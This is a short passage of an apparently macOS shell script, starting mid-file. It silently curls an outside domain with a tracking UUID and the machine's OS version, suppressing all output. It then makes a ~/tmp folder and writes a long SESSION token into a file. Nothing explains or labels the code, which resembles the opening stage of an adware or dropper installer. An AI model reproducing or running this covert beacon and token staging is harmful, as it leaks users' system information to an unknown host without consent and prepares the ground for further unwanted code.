...
curl -s "https://brightly.buzz/post_info?uuid=fa3e3558-6bac-4016-852e-affad34fafde&os=$(/usr/bin/sw_vers -productVersion)" > /dev/null 2>&1

cd ~
mkdir tmp
cd ~/tmp
echo SESSION=ze6HDqMiJfEIi/y4FYYTqxSwaIapFjPtomiS7IeOvD3qiQko8Nb9wZEOHDHvAZgzdKayQnbWzhGMIh+ISI5clQ== > context
